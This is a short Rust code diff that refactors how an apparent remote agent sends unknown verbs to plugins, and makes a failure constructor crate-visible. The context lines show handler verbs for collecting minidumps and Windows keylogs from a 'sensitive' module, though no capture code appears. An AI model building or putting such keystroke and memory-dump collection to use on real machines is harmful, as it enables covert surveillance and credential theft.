@@ -111,7 +111,9 @@ impl HandlerOutput {
             artifact: Some(artifact),
         }
     }
-    fn fail(output: String) -> HandlerOutput {
+    /// Crate-visible for the plugin seam: a module's run-status error is
+    /// the same failed output a compiled handler produces.
+    pub(crate) fn fail(output: String) -> HandlerOutput {
         HandlerOutput {
             outcome: Outcome::Failed,
             output,
@@ -157,16 +159,11 @@ pub fn dispatch(
         "collect.minidump" => crate::sensitive::collect_minidump(arguments),
         #[cfg(windows)]
         "collect.keylog" => crate::sensitive::collect_keylog(arguments),
-        _ => match plugins.dispatch(verb, arguments) {
-            Some((outcome, output)) => HandlerOutput {
-                outcome,
-                output,
-                artifact: None,
-            },
-            None => HandlerOutput::fail(format!(
+        _ => plugins.dispatch(verb, arguments).unwrap_or_else(|| {
+            HandlerOutput::fail(format!(
                 "{verb}: this build carries no handler for the verb"
-            )),
-        },
+            ))
+        }),
     }
 }
 
